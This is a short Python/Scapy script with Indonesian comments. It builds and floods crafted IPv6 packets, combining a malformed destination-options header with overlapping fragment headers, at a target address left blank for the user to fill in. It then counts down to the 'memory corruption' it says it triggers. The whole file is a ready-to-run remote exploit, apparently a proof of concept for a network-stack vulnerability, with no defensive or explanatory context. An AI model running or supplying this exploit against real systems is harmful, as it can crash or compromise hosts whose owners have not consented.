from scapy.all import *

# Inisialisasi variabel interface, alamat IP, alamat MAC, jumlah pengiriman, dan jumlah batch
iface = ''
ip_addr = ''
mac_addr = ''
num_tries = 20
num_batches = 20

# Fungsi untuk membuat paket-paket dengan menggunakan MAC Address yang ditentukan
def get_packets_with_mac(i):
    # Menghasilkan frag_id unik berdasarkan i
    frag_id = 0xdebac1e + i
    
    # Membuat paket pertama dengan header Ethernet dan IPv6
    first = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    
    # Membuat paket kedua dengan fragmentasi header IPv6
    second = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / 'aaaaaaaa'
    
    # Membuat paket ketiga dengan fragmen kedua dari paket IPv6
    third = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    
    # Mengembalikan daftar paket
    return [first, second, third]

# Fungsi untuk membuat paket IPv6 (tanpa Ethernet jika MAC Address kosong)
def get_packets(i):
    # Jika alamat MAC diberikan, gunakan fungsi dengan MAC Address
    if mac_addr != '':
        return get_packets_with_mac(i)
    
    # Menghasilkan frag_id unik berdasarkan i
    frag_id = 0xdebac1e + i
    
    # Membuat paket pertama tanpa Ethernet (hanya IPv6)
    first = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    
    # Membuat paket kedua dengan fragmentasi header IPv6
    second = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / 'aaaaaaaa'
    
    # Membuat paket ketiga dengan fragmen kedua dari paket IPv6
    third = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    
    # Mengembalikan daftar paket
    return [first, second, third]

# Variabel untuk menyimpan semua paket yang akan dikirim
final_ps = []

# Loop untuk menghasilkan batch paket berdasarkan jumlah yang ditentukan
for _ in range(num_batches):
    for i in range(num_tries):
        # Mendapatkan dua set paket dari fungsi get_packets dan menambahkannya ke final_ps
        final_ps += get_packets(i) + get_packets(i)

# Informasi bahwa paket sedang dikirim
print("Mengirimkan paket")

# Mengirimkan paket menggunakan sendp untuk Ethernet atau send jika tanpa Ethernet
if mac_addr != '':
    sendp(final_ps, iface)
else:
    send(final_ps, iface)

# Timer untuk memicu kemungkinan korupsi memori
for i in range(60):
    print(f"Korupsi memori akan dipicu dalam {60-i} detik", end='\r')
    time.sleep(1)

# Menginformasikan bahwa korupsi memori telah dipicu
print("")
